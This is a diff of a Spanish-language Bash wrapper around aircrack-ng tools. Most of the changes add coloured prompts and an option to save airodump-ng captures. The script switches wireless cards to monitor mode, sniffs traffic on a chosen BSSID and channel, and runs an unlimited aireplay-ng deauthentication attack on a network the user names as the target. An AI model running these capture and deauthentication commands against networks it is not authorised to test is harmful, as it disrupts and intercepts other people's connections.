@@ -26,40 +26,49 @@ trap ctrl_c INT
 
 #Funciones
 function configTargMon(){
-	echo -e "[+] Targetas de red disponibles:\n"
-	echo -e "$(ifconfig | grep 'flags=' | awk '{print "\t", $1}' | tr -d ':' | grep -v lo)\n"
-	echo -ne "[+] Seleccione una opcion: " && read opt2
-	echo -e "[+] Configurar targeta a:"
-	echo -e "\n\tmonitor\n\tmanage\n"
-	echo -ne "[+] Seleccione una opcion: " && read opt3
+	echo -e "${yellowColour}[+]${endColour}${blueColour} Targetas de red disponibles:${endColour}\n"
+	echo -e "${blueColour}$(ifconfig | grep 'flags=' | awk '{print "\t", $1}' | tr -d ':' | grep -v lo)\n${endColour}"
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Seleccione una opcion:${endColour} " && read opt2
+	echo -e "${yellowColour}[+]${endColour}${blueColour} Configurar targeta a:${endColour}"
+	echo -e "${blueColour}\n\tmonitor\n\tmanage\n${endColour}"
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Seleccione una opcion:${endColour} " && read opt3
 	if [ $opt3 == "monitor" ];then
 		sudo airmon-ng start $opt2
 	elif [ $opt3 == "manage" ]; then
 		sudo airmon-ng stop $opt2
 	else
-		echo -e "[!] Opcion invalida."
+		echo -e "${redColour}[!]${endColour}${blueColour} Opcion invalida.${endColour}"
 		configTargMon
 	fi
 	if [ $(echo $?) == 0 ]; then
-		echo -e "[+] Targeta configurada con exito!"
+		echo -e "${greenColour}[+]${endColour}${blueColour} Targeta configurada con exito!${endColour}"
 		sleep 1
 		menuPrincipal
 	else
-		echo -e "[!] Ha ocurrido un error."
+		echo -e "${redColour}[!]${endColour}${blueColour} Ha ocurrido un error.${endColour}"
 		sleep 1
 		menuPrincipal
 	fi
 }
 function airodump-ng(){
-	echo -e "[i] Seleccione targeta de red, recuerde que esta opcion necesita tener una targeta en modo monitor: "
-	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')"
-	echo -ne "[+] Seleccion: " && read opt4
-	sudo airodump-ng $opt4
+	echo -e "${yellowColour}[i]${endColour}${blueColour} Seleccione targeta de red, recuerde que esta opcion necesita tener una targeta en modo monitor: ${endColour}"
+	echo -e "${blueColour}$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')${endColour}"
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Seleccion: ${endColour}" && read opt4
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Desea guardar el output?(si/no):${endColour} " && read opt8
+	if [ $opt8 == "si" ]; then
+		echo -ne "${yellowColour}[+]${endColour}${blueColour} Con que nombre desear guardar el output?:${endColour} " && read opt9
+		sudo airodump-ng $opt4 --write $opt9
+	elif [ $opt8 == "no" ]; then
+		sudo airodump-ng $opt4
+	else
+		echo -e "${redColour}[!]${endColour}${blueColour} Opcion no valida.${endColour}"
+		sleep 2
+	fi
 	if [ $(echo $?) == 0 ]; then
 		sleep 1
 		menuPrincipal
 	else
-		echo -e "[!] Ha ocurrido un error."
+		echo -e "${redColour}[!]${endColour}${blueColour} Ha ocurrido un error.${endColour}"
 		sleep 1
 		menuPrincipal
 	fi
@@ -67,21 +76,21 @@ function airodump-ng(){
 }
 
 function airodump-ng2(){
-	echo -e "[i] Seleccione targeta de red, recuerde que esta opcion necesita tener una targeta en modo monitor: "
-	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')"
-	echo -ne "[+] Seleccion: " && read opt5
-	echo -ne "[+] Ingrese el bssid de la red a escanear: " && read opt6
-	echo -ne "[+] Ingrese el canal de la red a escanear: " && read opt7
+	echo -e "${yellowColour}[i]${endColour}${blueColour} Seleccione targeta de red, recuerde que esta opcion necesita tener una targeta en modo monitor: ${endColour}"
+	echo -e "${blueColour}$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')${endColour}"
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Seleccion: ${endColour}" && read opt5
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Ingrese el bssid de la red a escanear:${endColour} " && read opt6
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Ingrese el canal de la red a escanear: ${endColour}" && read opt7
 	sudo airodump-ng $opt5 --bssid $opt6 --channel $opt7
 }
 
 function aireplay(){
 
-	echo -e "[+] Seleccione la targeta de red para el ataque, debe estar en modo monitor: "
-	echo -e "$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')"
-	echo -ne "[+] Seleccion: " && read targetaDeAtaque 
-	echo -ne "[+] Ingrese el bssid de la red a atacar: " && read bssid
-	echo -ne "[+] Ingrese canal de la red a atacar: " && read canal
+	echo -e "${yellowColour}[+]${endColour}${blueColour} Seleccione la targeta de red para el ataque, debe estar en modo monitor:${endColour} "
+	echo -e "${blueColour}$(ifconfig | grep 'flags=' | awk '{print $1}' | tr -d ':' | grep -v lo | grep 'mon')${endColour}"
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Seleccion:${endColour} " && read targetaDeAtaque 
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Ingrese el bssid de la red a atacar: ${endColour}" && read bssid
+	echo -ne "${yellowColour}[+]${endColour}${blueColour} Ingrese canal de la red a atacar: ${endColour}" && read canal
 	sudo iwconfig $targetaDeAtaque channel $canal
 	sudo aireplay-ng -0 0 -a $bssid $targetaDeAtaque
 
